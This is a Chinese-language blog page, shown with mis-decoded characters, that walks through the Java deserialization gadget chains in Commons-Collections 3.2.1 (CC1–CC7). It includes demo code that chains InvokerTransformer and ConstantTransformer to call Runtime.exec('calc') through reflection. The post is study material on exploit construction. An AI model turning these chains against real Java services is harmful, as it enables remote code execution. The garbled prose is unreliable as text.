<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Commons-Collections1-7 | Jiecub3</title>
<meta name="keywords" content="">
<meta name="description" content="å‰è¨€ï¼šä¸»è¦æ˜¯è®°å½•è‡ªå·±æ ¹æ®åˆ©ç”¨é“¾ï¼Œç„¶åç¼–å†™pocåŠé‡åˆ°çš„é—®é¢˜å’Œè§£å†³ï¼Œç„¶åç»„åˆä¸€æ¡é“¾å­ï¼ˆæ²¡å•¥æ„ä¹‰å½“ç»ƒæ‰‹ 0x01 ç¯å¢ƒ &lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/junit/junit --&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.11&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt; &lt;/dependency&gt;">
<meta name="author" content="Jiecub3">
<link rel="canonical" href="https://Jiecub3.github.io/zh/posts/java/chain/cc_chain/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.6498a9db1bad4c0d045c3aa5ba217809694eb596cf8fff3516fcb871a2dfe03e.css" integrity="sha256-ZJip2xutTA0EXDqluiF4CWlOtZbPj/81Fvy4caLf4D4=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="16x16" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="32x32" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="apple-touch-icon" href="https://Jiecub3.github.io/logo.gif">
<link rel="mask-icon" href="https://Jiecub3.github.io/logo.gif">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="https://Jiecub3.github.io/zh/posts/java/chain/cc_chain/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="Commons-Collections1-7" />
<meta property="og:description" content="å‰è¨€ï¼šä¸»è¦æ˜¯è®°å½•è‡ªå·±æ ¹æ®åˆ©ç”¨é“¾ï¼Œç„¶åç¼–å†™pocåŠé‡åˆ°çš„é—®é¢˜å’Œè§£å†³ï¼Œç„¶åç»„åˆä¸€æ¡é“¾å­ï¼ˆæ²¡å•¥æ„ä¹‰å½“ç»ƒæ‰‹ 0x01 ç¯å¢ƒ &lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/junit/junit --&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.11&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt; &lt;/dependency&gt;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://Jiecub3.github.io/zh/posts/java/chain/cc_chain/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-11-11T20:01:23+08:00" />
<meta property="article:modified_time" content="2024-11-11T20:01:23+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Commons-Collections1-7"/>
<meta name="twitter:description" content="å‰è¨€ï¼šä¸»è¦æ˜¯è®°å½•è‡ªå·±æ ¹æ®åˆ©ç”¨é“¾ï¼Œç„¶åç¼–å†™pocåŠé‡åˆ°çš„é—®é¢˜å’Œè§£å†³ï¼Œç„¶åç»„åˆä¸€æ¡é“¾å­ï¼ˆæ²¡å•¥æ„ä¹‰å½“ç»ƒæ‰‹ 0x01 ç¯å¢ƒ &lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/junit/junit --&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.11&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt; &lt;/dependency&gt;"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://Jiecub3.github.io/zh/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Commons-Collections1-7",
      "item": "https://Jiecub3.github.io/zh/posts/java/chain/cc_chain/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Commons-Collections1-7",
  "name": "Commons-Collections1-7",
  "description": "å‰è¨€ï¼šä¸»è¦æ˜¯è®°å½•è‡ªå·±æ ¹æ®åˆ©ç”¨é“¾ï¼Œç„¶åç¼–å†™pocåŠé‡åˆ°çš„é—®é¢˜å’Œè§£å†³ï¼Œç„¶åç»„åˆä¸€æ¡é“¾å­ï¼ˆæ²¡å•¥æ„ä¹‰å½“ç»ƒæ‰‹ 0x01 ç¯å¢ƒ \u0026lt;dependencies\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/junit/junit --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;junit\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;junit\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.11\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt;",
  "keywords": [
    
  ],
  "articleBody": " å‰è¨€ï¼šä¸»è¦æ˜¯è®°å½•è‡ªå·±æ ¹æ®åˆ©ç”¨é“¾ï¼Œç„¶åç¼–å†™pocåŠé‡åˆ°çš„é—®é¢˜å’Œè§£å†³ï¼Œç„¶åç»„åˆä¸€æ¡é“¾å­ï¼ˆæ²¡å•¥æ„ä¹‰å½“ç»ƒæ‰‹\n0x01 ç¯å¢ƒ junit junit 4.11 test commons-collections commons-collections 3.2.1 Transformer æ¥å£\npublic interface Transformer { Object transform(Object var1); } ç„¶åä¸‹é¢ä¸‰ä¸ªå®ç°ç±»ï¼ŒCCé“¾å­åˆ©ç”¨æ ¸å¿ƒï¼Œéƒ½å®ç°äº†Transformeræ–¹æ³•ï¼Œç„¶åè¿™é‡Œå…ˆåšä¸ªç®€å•å®šä¹‰å§\nInvokerTransformer ä¸éš¾çœ‹å‡ºæ˜¯ é€šè¿‡åå°„è°ƒç”¨objæ–¹æ³•ï¼Œæ¡ä»¶éœ€è¦ä¼ å…¥obj\næ–¹æ³•åå­—ï¼Œå¯¹åº”æ–¹æ³•å‚æ•°ç±»å‹ï¼Œæœ€åå‚æ•° éƒ½å¯ä»¥åˆå§‹åŒ–çš„æ—¶å€™ä¼ å…¥\npublic InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; } public Object transform(Object input) { if (input == null) { return null; } else { try { Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); }.... ConstantTransformer è¿”å›åˆå§‹åŒ–ä¼ å…¥çš„obj\npublic ConstantTransformer(Object constantToReturn) { this.iConstant = constantToReturn; } public Object transform(Object input) { return this.iConstant; } ChainedTransformer åƒä¸€ä¸ªé“¾å­forè°ƒç”¨transformï¼Œä¸Šä¸€ä¸ªthis.iTransformers[i]è°ƒç”¨ç»“æœä½œä¸ºä¸‹ä¸€ä¸ªobjectå‚æ•°\nè¿™é‡Œç€é‡çœ‹forçš„ä»£ç ï¼Œæ‰§è¡Œä¸€æ¬¡åobjectå€¼å°±è¢«è¦†ç›–äº†ï¼Œç„¶åå¦‚æœforæ²¡ç»“æŸè¿™é‡Œ++iï¼Œè¿™æ¬¡transformä¸­çš„objectå°±æ˜¯ä¸Šæ¬¡è¢«è¦†ç›–çš„objectå€¼ï¼ˆè¿™é‡Œèµ·åˆæ²¡çœ‹æ‡‚ï¼Œç¬¨è›‹ï¼‰,forèµ°å®Œæ‰ä¼šreturn\npublic ChainedTransformer(Transformer[] transformers) { this.iTransformers = transformers; } public Object transform(Object object) { for(int i = 0; i \u003c this.iTransformers.length; ++i) { object = this.iTransformers[i].transform(object); } return object; } å¯¹è¿™å‡ ä¸ªæœ‰å¤§æ¦‚äº†è§£ï¼Œæˆ‘ä»¬è¿™é‡Œå¯ä»¥å†™ä¸ªdemo\nInvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",new Class[]{String.class}, new Object[]{\"calc\"}); ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime()); Transformer[] transformers=new Transformer[]{constantTransformer,invokerTransformer}; Transformer keyTransformer = new ChainedTransformer(transformers); keyTransformer.transform(\"calc\"); ç›´æ¥è·å–Runtimeå¯¹è±¡ç„¶åè°ƒç”¨execæ–¹æ³•æ‰§è¡Œcalc\né—®é¢˜1 Runtimeä¸èƒ½åºåˆ—åŒ– Exception in thread \"main\" java.io.NotSerializableException: java.lang.Runtime Runtimeç±»æ˜¯æ²¡æœ‰ç»§æ‰¿Serializableçš„ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥è°ƒç”¨Runtime.getRuntime()è‚¯å®šæ˜¯ä¸è¡Œçš„\nè§£å†³ï¼š\nå¯ä»¥ç”¨Runtime.class =\u003e å±äºjava.lang.Class =\u003e ç»§æ‰¿java.io.Serializable\né‚£ä¹ˆå°±æ˜¯æ„é€ é—®é¢˜äº†ï¼Œä¸‹é¢æ˜¯demo2\nMethod getRuntime = Runtime.class.getMethod(\"getRuntime\"); Runtime invoke = (Runtime) getRuntime.invoke(null); invoke.exec(\"calc\"); ç–‘é—®1 invoke(null) è¿™é‡Œä¸ºä»€ä¹ˆæ˜¯invoke(null),ä¸€èˆ¬ä¸éƒ½æ˜¯invoke(obj)ä¹ˆ\nè§£ç­”ï¼š\nç»“è®ºï¼šå› ä¸ºgetRuntimeæ˜¯é™æ€æ–¹æ³•\nåœ¨ Java ä¸­ï¼Œ**é™æ€æ–¹æ³•æ˜¯å±äºç±»æœ¬èº«è€Œä¸æ˜¯ç±»çš„å®ä¾‹ï¼ˆå¯¹è±¡ï¼‰çš„æ–¹æ³•ã€‚**å¯ä»¥é€šè¿‡ç±»åç›´æ¥è°ƒç”¨é™æ€æ–¹æ³•ï¼Œè€Œæ— éœ€åˆ›å»ºç±»çš„å®ä¾‹ã€‚\nRuntime.class.getMethod(\"getRuntime\")è·å–çš„æ˜¯Runtimeç±»çš„getRuntimeæ–¹æ³•\ngetRuntime.invoke(null)å®é™…ä¸Šå°±æ˜¯é€šè¿‡åå°„è°ƒç”¨é™æ€æ–¹æ³•getRuntimeï¼Œä¼ å…¥nullè¡¨ç¤ºæ²¡æœ‰ç‰¹å®šçš„å¯¹è±¡å®ä¾‹å‚ä¸è°ƒç”¨ï¼Œ\nå› ä¸ºè¯¥æ–¹æ³•æœ¬æ¥å°±ä¸éœ€è¦å¯¹è±¡å®ä¾‹æ¥è°ƒç”¨ã€‚\nä½†æ˜¯è¿™é‡Œä¸èƒ½ç›´æ¥è¿™æ ·ç”¨çœ‹åˆ°**InvokerTransformer.transform**ï¼Œè¿™é‡Œä¼ å…¥çš„Runtime.classä¼šå˜æˆClass",
  "wordCount" : "10831",
  "inLanguage": "zh",
  "datePublished": "2024-11-11T20:01:23+08:00",
  "dateModified": "2024-11-11T20:01:23+08:00",
  "author":{
    "@type": "Person",
    "name": "Jiecub3"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://Jiecub3.github.io/zh/posts/java/chain/cc_chain/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Jiecub3",
    "logo": {
      "@type": "ImageObject",
      "url": "https://Jiecub3.github.io/img/logo.gif"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://Jiecub3.github.io/zh/" accesskey="h" title="Jiecub3 (Alt + H)">Jiecub3</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://Jiecub3.github.io/zh/" title="é¦–é¡µ">
                    <span>é¦–é¡µ</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/archives/" title="å½’æ¡£">
                    <span>å½’æ¡£</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/categories/" title="åˆ†ç±»">
                    <span>åˆ†ç±»</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/search" title="æœç´¢ğŸ”ï¸">
                    <span>æœç´¢ğŸ”ï¸</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/about/" title="å…³äº">
                    <span>å…³äº</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://Jiecub3.github.io/zh/">ğŸ ä¸»é¡µ</a>&nbsp;Â»&nbsp;<a href="https://Jiecub3.github.io/zh/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      Commons-Collections1-7
    </h1>
    <div class="post-meta"><span title='2024-11-11 20:01:23 +0800 CST'>2024-11-11</span>&nbsp;Â·&nbsp;22 åˆ†é’Ÿ&nbsp;Â·&nbsp;Jiecub3

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">ç›®å½•</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#0x01-%e7%8e%af%e5%a2%83" aria-label="0x01 ç¯å¢ƒ">0x01 ç¯å¢ƒ</a><ul>
                            <ul>
                            
                    <li>
                        <a href="#transformer" aria-label="Transformer">Transformer</a></li>
                    <li>
                        <a href="#invokertransformer" aria-label="InvokerTransformer">InvokerTransformer</a></li>
                    <li>
                        <a href="#constanttransformer" aria-label="ConstantTransformer">ConstantTransformer</a></li>
                    <li>
                        <a href="#chainedtransformer" aria-label="ChainedTransformer">ChainedTransformer</a><ul>
                            
                    <li>
                        <a href="#%e9%97%ae%e9%a2%981-runtime%e4%b8%8d%e8%83%bd%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="é—®é¢˜1 Runtimeä¸èƒ½åºåˆ—åŒ–">é—®é¢˜1 Runtimeä¸èƒ½åºåˆ—åŒ–</a></li>
                    <li>
                        <a href="#%e7%96%91%e9%97%ae1-invokenull" aria-label="ç–‘é—®1 invoke(null)">ç–‘é—®1 invoke(null)</a></li></ul>
                    </li>
                    <li>
                        <a href="#cc%e5%88%a9%e7%94%a8demo" aria-label="CCåˆ©ç”¨demo">CCåˆ©ç”¨demo</a></li></ul>
                        </ul>
                    </li>
                    <li>
                        <a href="#commonscollections1" aria-label="CommonsCollections1"><strong>CommonsCollections1</strong></a><ul>
                            <ul>
                            
                    <li>
                        <a href="#transformedmap%e5%88%a9%e7%94%a8%e9%93%be-8u71%e4%b9%8b%e5%89%8d" aria-label="TransformedMapåˆ©ç”¨é“¾ 8u71ä¹‹å‰"><strong>TransformedMapåˆ©ç”¨é“¾</strong> 8u71ä¹‹å‰</a><ul>
                            <ul>
                            
                    <li>
                        <a href="#%e7%ae%80%e5%8d%95%e5%88%86%e6%9e%901-var6get" aria-label="ç®€å•åˆ†æ1 var6.get">ç®€å•åˆ†æ1 var6.get</a></li>
                    <li>
                        <a href="#%e8%b6%a3%e4%ba%8b1-jdk%e4%b8%8b%e8%bd%bd" aria-label="è¶£äº‹1 jdkä¸‹è½½">è¶£äº‹1 jdkä¸‹è½½</a></li>
                    <li>
                        <a href="#%e9%97%ae%e9%a2%982-%e6%96%ad%e7%82%b9" aria-label="é—®é¢˜2 æ–­ç‚¹">é—®é¢˜2 æ–­ç‚¹</a></li>
                    <li>
                        <a href="#%e6%ad%a3%e7%89%87%e5%bc%80%e5%a7%8b" aria-label="æ­£ç‰‡å¼€å§‹">æ­£ç‰‡å¼€å§‹</a></li>
                    <li>
                        <a href="#%e7%96%91%e9%97%ae2-value" aria-label="ç–‘é—®2 value">ç–‘é—®2 value</a></li>
                    <li>
                        <a href="#%e7%96%91%e9%97%ae3-parent" aria-label="ç–‘é—®3 parent">ç–‘é—®3 parent</a></li>
                    <li>
                        <a href="#%e5%ad%98%e6%a1%a31-type" aria-label="å­˜æ¡£1 type">å­˜æ¡£1 type</a></li></ul>
                        </ul>
                    </li>
                    <li>
                        <a href="#lazymap" aria-label="LazyMap">LazyMap</a><ul>
                            
                    <li>
                        <a href="#poc%e6%9e%84%e9%80%a0" aria-label="pocæ„é€ ">pocæ„é€ </a><ul>
                            
                    <li>
                        <a href="#%e9%97%ae%e9%a2%983-debug" aria-label="é—®é¢˜3 debug">é—®é¢˜3 debug</a></li></ul>
                    </li></ul>
                    </li></ul>
                        </ul>
                    </li>
                    <li>
                        <a href="#commonscollections6" aria-label="CommonsCollections6"><strong>CommonsCollections6</strong></a><ul>
                            <ul>
                            <ul>
                            <ul>
                            
                    <li>
                        <a href="#%e9%97%ae%e9%a2%984-lazymapget" aria-label="é—®é¢˜4 Lazymap.get">é—®é¢˜4 Lazymap.get</a></li></ul>
                        </ul>
                        </ul>
                        </ul>
                    </li>
                    <li>
                        <a href="#commonscollections5" aria-label="CommonsCollections5">CommonsCollections5</a><ul>
                            <ul>
                            <ul>
                            <ul>
                            
                    <li>
                        <a href="#%e9%97%ae%e9%a2%985-val" aria-label="é—®é¢˜5 val">é—®é¢˜5 val</a></li></ul>
                        </ul>
                        </ul>
                        </ul>
                    </li>
                    <li>
                        <a href="#commonscollections3" aria-label="CommonsCollections3">CommonsCollections3</a><ul>
                            <ul>
                            <ul>
                            <ul>
                            
                    <li>
                        <a href="#%e9%97%ae%e9%a2%986-nullpointerexception" aria-label="é—®é¢˜6 NullPointerException">é—®é¢˜6 NullPointerException</a></li></ul>
                        </ul>
                        </ul>
                        </ul>
                    </li>
                    <li>
                        <a href="#commonscollections7" aria-label="CommonsCollections7">CommonsCollections7</a><ul>
                            <ul>
                            <ul>
                            <ul>
                            
                    <li>
                        <a href="#%e9%97%ae%e9%a2%987-ekey" aria-label="é—®é¢˜7 e.key">é—®é¢˜7 e.key</a></li>
                    <li>
                        <a href="#%e9%97%ae%e9%a2%988-hashindex" aria-label="é—®é¢˜8 hash&amp;amp;index">é—®é¢˜8 hash&amp;index</a></li>
                    <li>
                        <a href="#%e9%97%ae%e9%a2%989-hash" aria-label="é—®é¢˜9 hash">é—®é¢˜9 hash</a></li>
                    <li>
                        <a href="#%e9%97%ae%e9%a2%989-3%e8%a7%a3%e5%86%b3" aria-label="*é—®é¢˜9 3è§£å†³">*é—®é¢˜9 3è§£å†³</a><ul>
                            
                    <li>
                        <a href="#%e8%a7%a3%e5%86%b3%e4%b8%80" aria-label="è§£å†³ä¸€">è§£å†³ä¸€</a></li>
                    <li>
                        <a href="#%e8%a7%a3%e5%86%b3%e4%ba%8c" aria-label="è§£å†³äºŒ">è§£å†³äºŒ</a></li>
                    <li>
                        <a href="#%e8%a7%a3%e5%86%b3%e4%b8%89-no" aria-label="*è§£å†³ä¸‰ NO?">*è§£å†³ä¸‰ NO?</a></li></ul>
                    </li>
                    <li>
                        <a href="#poc" aria-label="poc">poc</a></li></ul>
                        </ul>
                        </ul>
                        
                    <li>
                        <a href="#%e5%ad%98%e6%a1%a32-%e6%94%b9%e7%bc%96cc7" aria-label="å­˜æ¡£2 æ”¹ç¼–CC7">å­˜æ¡£2 æ”¹ç¼–CC7</a></li></ul>
                    </li>
                    <li>
                        <a href="#commonscollections2" aria-label="CommonsCollections2"><strong>CommonsCollections2</strong></a></li>
                    <li>
                        <a href="#0x02-%e7%8e%af%e5%a2%83" aria-label="0x02 ç¯å¢ƒ">0x02 ç¯å¢ƒ</a></li>
                    <li>
                        <a href="#commonscollections4" aria-label="CommonsCollections4"><strong>CommonsCollections4</strong></a></li>
                    <li>
                        <a href="#0x03-%e5%ad%98%e6%a1%a3%e6%8c%96%e6%8e%98" aria-label="0x03 å­˜æ¡£æŒ–æ˜">0x03 å­˜æ¡£æŒ–æ˜</a>
                    </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><blockquote>
<p>å‰è¨€ï¼šä¸»è¦æ˜¯è®°å½•è‡ªå·±æ ¹æ®<code>åˆ©ç”¨é“¾</code>ï¼Œç„¶åç¼–å†™pocåŠé‡åˆ°çš„é—®é¢˜å’Œè§£å†³ï¼Œç„¶åç»„åˆä¸€æ¡é“¾å­ï¼ˆæ²¡å•¥æ„ä¹‰å½“ç»ƒæ‰‹</p>
</blockquote>
<h1 id="0x01-ç¯å¢ƒ">0x01 ç¯å¢ƒ<a hidden class="anchor" aria-hidden="true" href="#0x01-ç¯å¢ƒ">#</a></h1>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependencies&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!-- https://mvnrepository.com/artifact/junit/junit --&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;groupId&gt;</span>junit<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>junit<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;version&gt;</span>4.11<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;scope&gt;</span>test<span class="nt">&lt;/scope&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;groupId&gt;</span>commons-collections<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>commons-collections<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;version&gt;</span>3.2.1<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependencies&gt;</span>
</span></span></code></pre></div><h3 id="transformer">Transformer<a hidden class="anchor" aria-hidden="true" href="#transformer">#</a></h3>
<p>æ¥å£</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">interface</span> <span class="nc">Transformer</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Object</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">var1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>ç„¶åä¸‹é¢ä¸‰ä¸ªå®ç°ç±»ï¼ŒCCé“¾å­åˆ©ç”¨æ ¸å¿ƒï¼Œéƒ½å®ç°äº†Transformeræ–¹æ³•ï¼Œç„¶åè¿™é‡Œå…ˆåšä¸ªç®€å•å®šä¹‰å§</p>
<h3 id="invokertransformer">InvokerTransformer<a hidden class="anchor" aria-hidden="true" href="#invokertransformer">#</a></h3>
<p>ä¸éš¾çœ‹å‡ºæ˜¯ <code>é€šè¿‡åå°„è°ƒç”¨objæ–¹æ³•</code>ï¼Œæ¡ä»¶éœ€è¦ä¼ å…¥obj</p>
<p><strong>æ–¹æ³•åå­—ï¼Œå¯¹åº”æ–¹æ³•å‚æ•°ç±»å‹ï¼Œæœ€åå‚æ•°</strong> éƒ½å¯ä»¥åˆå§‹åŒ–çš„æ—¶å€™ä¼ å…¥</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="nf">InvokerTransformer</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">methodName</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="w"> </span><span class="n">paramTypes</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
